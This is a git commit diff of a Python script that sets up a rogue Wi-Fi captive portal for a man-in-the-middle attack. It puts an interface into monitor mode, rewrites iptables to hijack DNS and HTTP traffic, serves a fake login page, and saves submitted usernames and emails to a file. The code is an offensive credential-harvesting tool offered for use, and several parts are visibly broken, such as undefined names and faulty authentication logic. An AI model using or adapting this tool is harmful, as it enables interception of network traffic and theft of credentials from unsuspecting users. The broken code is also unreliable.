17a5abb313908a5bb36026fae6386ebd93a8146a
flyingfishfuse <46322912+flyingfishfuse@users.noreply.github.com>
2019-01-12 08:08:48 -0600

    Add files via upload

--- captiveportalmirror.py
+++ captiveportalmirror.py
@@ -5,7 +5,7 @@
 import subprocess
 
 from http.server import HTTPServer as Webserver
-import http
+import http.server
 
 #try:
 #    from urllib.parse import urlparse
@@ -34,77 +34,40 @@ def greenprint(text):
 def redprint(text):
     print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL)
 
-
-import ipaddress
 import cgitb
 import cgi
 import os
 import re
 # These variables are used as settings
+#set to your appropriate ifaces
+moniface        = 'eth0'
+iface           = 'eth1'
 PORT       = 9090         # the port in which the captive portal web server listens
 IFACE      = "wlan2"      # the interface that captive portal protects
-IP_ADDRESS = "172.16.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
+IP_ADDRESS = "192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
 filename        = 'credentials.txt'
 
-HOSTNAME        = 'hackbiscuits'
-PORT            = 8765
-
-url             = 'http://192.168.0.1/index.html'
-
-#this is the network address pool settings. i suggest class C/24
-ipc             = 'c'
-hostbit         = '24'
-
-#set to your appropriate ifaces
-moniface        = 'wlan0'
-iface           = 'eth0'
-
-
+global remote_IP
 hostlist        = []
 networkaddrpool = []
+
 i1name = 'username'
 i2name = 'email'
 i3name = 'submit'
-formdata = cgi.FieldStorage()
-input1 = formdata.getvalue(i1name)
-input2 = formdata.getvalue(i2name)
-input3 = formdata.getvalue(i3name)
+
 portalpage = '/portal/login.php.html'
-PORT = ':8000'
-
-
+credentials = [[ 'nikos' , 'fotiou'] ,
+                ['user1' , 'password'],
+                ['user2' , 'password2'],
+                ['hacker' , 'root']]
 
 def serveportal():
-    httpd = Webserver((HOSTNAME, PORT), http.server.CGIHTTPRequestHandler)
+    httpd = http.server.HTTPServer((ipaddress, PORT), CaptivePortal)
     try:
 
         httpd.serve_forever()
     except KeyboardInterrupt:
         pass
-
-def makenetworkaddresspool(ipclass, hostbits):
-    #make sure you match the class to the IP or this breaks
-    global netmask
-    global broadcast
-    global ipaddr
-    if ipclass == 'c' :
-        ip = '192.168.0.0'
-        makenet(ip,hostbits)
-    elif ipclass == 'b' :
-        ip = '172.16.0.0'
-        makenet(ip,hostbits)
-    elif ipclass == 'a' :
-        ip = '10.0.0.0'
-        makenet(ip,hostbits)
-
-def makenet(ip,hostbits):
-    network_IPV4 = ipaddress.ip_network('{0}/{1}'.format(ip, hostbits))
-    for each in network_IPV4:
-        networkaddrpool.append(str(each))
-    ipaddr = str(networkaddrpool[1])
-#    broadcast = str(ipaddress.ip_address('{0}'.format(ip)).broadcast)
-
-makenetworkaddresspool(ipc, hostbit)
 
 
 class CaptivePortal(http.server.SimpleHTTPRequestHandler):
@@ -116,10 +79,10 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         <meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
     </head>
     <body>
-        <b>Redirecting to login page</b>
+        <b>Redirecting to MITM hoasted captive portal page</b>
     </body>
     </html>
-    """.format(ipadrress, PORT, portalpage)
+    """.format(IP_ADDRESS, PORT, portalpage)
     html_login = """
     <!DOCTYPE html>
     <html>
@@ -136,52 +99,29 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
     </body>
     </html>
     """
-    def do_GET(self):
-        path = self.path
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        if path == "/admin":
-            self.wfile.write(self.html_login)
-            remote_IP = self.client_address[0]
-            hostlist.append(remote_IP)
-        else:
-            #we are using an external file instead of a local variable
-            self.wfile.write(self.html_redirect)
 
-    '''
-    this is called when the user submits the login form
-    '''
-    def do_POST(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        form = cgi.FieldStorage(
-            fp=self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD':'POST',
-                     'CONTENT_TYPE':self.headers['Content-Type'],
-                     })
-        username = form.getvalue("username")
-        password = form.getvalue("password")
-        #dummy security check
-        if username == 'nikos' and password == 'fotiou':
-            #authorized user
-            remote_IP = self.client_address[0]
-            greenprint('New authorization from '+ remote_IP)
-            greenprint('adding to super leet hacker address pool')
-            networkaddrpool.append(remote_IP)
-            redprint('Updating IP tables')
-            subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
-            subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
-            self.wfile.write("You are now hacker authorized. Navigate to any URL")
-        else:
-            #show the login form
-            self.wfile.write(self.html_login)
+    def authpassthrough():
+        redprint('Updating IP tables to allow {0} through'.format(remote_IP))
+        subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
+        subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
+
+    def authenticate(self, username, password):
+        for username_password in credentials:
+            if username_password[0][0] == username and credentials[username_password[0][0]] == password:
+                remote_IP = self.client_address[0]
+                greenprint('New authorization from '+ remote_IP)
+                greenprint('adding to address pool')
+                networkaddrpool.append(remote_IP)
+                self.wfile.write("You are now hacker authorized. Navigate to any URL")
+                authpassthrough()
+            else:
+                self.wfile.write(self.html_login)
+
 
     def savecredentials(self, filename):
         remote_IP = self.client_address[0]
         hostlist.append(remote_IP)
+        formdata = cgi.FieldStorage()
         try:
             with open(filename, 'ab') as filehandle:
                 input1 = formdata.getvalue(i1name)
@@ -198,6 +138,31 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
         self.wfile.write("You are now authorized. Navigate to any URL")
 
+    def do_GET(self):
+        path = self.path
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        if path == "/":
+            self.wfile.write(self.html_login)
+        else:
+            #we are using an external file instead of a local variable
+            self.wfile.write(self.html_redirect)
+
+    def do_POST(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        form = cgi.FieldStorage(
+            fp=self.rfile,
+            headers=self.headers,
+            environ={'REQUEST_METHOD':'POST',
+                     'CONTENT_TYPE':self.headers['Content-Type'],
+                     })
+        username = form.getvalue("username")
+        password = form.getvalue("password")
+        authenticate(username,password)
+
     #the following function makes server produce no output
     #comment it out if you want to print diagnostic messages
     #def log_message(self, format, *args):
@@ -205,43 +170,59 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
 
 
 def EstablishMITMnetwork():
-    # build a rule chain for packet forwarding
-    # make sure to remember dns poisoning!
-    #make sure to replace static names with variables!
-    print(os.popen("ip link set {0} down".format(iface)).read())
-    print(os.popen("ip addr add {0} dev {1}".format(ipaddr, iface)).read())
-    print(os.popen("iwconfig {0} mode monitor".format(moniface)).read())
-    print(os.popen("ip link set {0} up".format(iface)).read())
-    print(os.popen("iptables --flush").read())
-    print(os.popen("iptables --table nat --flush").read())
-    print(os.popen("iptables --delete-chain").read())
-    print(os.popen("iptables --table nat --delete-chain").read())
-    #enable ip Forwarding
-    print(os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read())
-    #Setup a NAT environment
-    print(os.popen("iptables --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(iface)).read())
-    #allow incomming from the outside on the monitor iface
-    print(os.popen("iptables --append FORWARD --in-interface {0} -j ACCEPT".format(moniface)).read())
-    #allow UDP DNS resolution inside the NAT  via prerouting so we dont have to deal with that
-    print(os.popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to " + ipaddr).read())
-    #Allow Loopback Connections
-    print(os.popen("sudo iptables -A INPUT -i lo -j ACCEPT").read())
-    print(os.popen("sudo iptables -A OUTPUT -o lo -j ACCEPT").read())
-    #Allow Established and Related Incoming Connections
-    print(os.popen("sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT").read())
-    #Allow Established Outgoing Connections
-    print(os.popen("sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT").read())
-    #Internal to External
-    print(os.popen("sudo iptables -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface)).read())
-    #Drop Invalid Packets
-    print(os.popen("sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP").read())
-    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", "53", "-j" ,"ACCEPT"])
-    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"])
-    print(".. Allow traffic to captive portal")
-    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", str(PORT),"-d", IP_ADDRESS, "-j" ,"ACCEPT"])
-    print(".. Block all other traffic")
-    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-j" ,"DROP"])
-    print("Starting web server")
-    httpd = BaseHTTPServer.HTTPServer(('', PORT), CaptivePortal)
-    print("Redirecting HTTP traffic to captive portal")
+    os.popen("ip link set {0} down".format(iface))
+    os.popen("ip addr add {0} dev {1}".format(IP_ADDRESS, iface))
+    try:
+        p = subprocess.check_output(["iwconfig", moniface,  "mode", "monitor"], stderr=subprocess.PIPE)
+        greenprint("[+] Monitor Mode Enabled")
+    except subprocess.CalledProcessError as e:
+        redprint("[-] Failed to set monitor mode")
+    else:
+        greenprint("[+] Monitor Mode Enabled")
+    os.popen("ip link set {0} up".format(iface))
+    greenprint("[+]Clearing IP Tables Rulesets")
+    os.popen("iptables -w 3 --flush")
+    os.popen("iptables -w 3 --table nat --flush")
+    os.popen("iptables -w 3 --delete-chain")
+    os.popen("iptables -w 3 --table nat --delete-chain")
+    greenprint("[+]enable ip Forwarding")
+    os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    greenprint("[+]Setup a NAT environment")
+    os.popen("iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(iface))
+    greenprint("[+]allow incomming from the outside on the monitor iface")
+    os.popen("iptables -w 3 --append FORWARD --in-interface {0} -j ACCEPT".format(moniface))
+    greenprint("[+]allow UDP DNS resolution inside the NAT  via prerouting")
+    os.popen("iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to " + IP_ADDRESS)
+    greenprint("[+]Allow Loopback Connections")
+    os.popen("iptables -w 3 -A INPUT -i lo -j ACCEPT")
+    os.popen("iptables -w 3 -A OUTPUT -o lo -j ACCEPT")
+    greenprint("[+]Allow Established and Related Incoming Connections")
+    os.popen("iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT")
+    greenprint("[+]Allow Established Outgoing Connections")
+    os.popen("iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT")
+    greenprint("[+]Internal to External")
+    os.popen("iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface))
+    greenprint("[+]Drop Invalid Packets")
+    os.popen("iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP")
+    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", "53", "-j" ,"ACCEPT"])
+    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"])
+    redprint(".. Allow traffic to captive portal")
+    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", str(PORT),"-d", IP_ADDRESS, "-j" ,"ACCEPT"])
+    redprint(".. Block all other traffic")
+    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-j" ,"DROP"])
+    ###################################################
+    #
+    #       HERE IS WHERE THE WERVER IS STARTED
+    #
+    #
+    ###################################################
+    greenprint("Starting web server")
+    serveportal()
+    greenprint("Redirecting HTTP traffic to captive portal")
     subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", IP_ADDRESS+":"+str(PORT)])
+
+
+
+
+EstablishMITMnetwork()
+CaptivePortal()
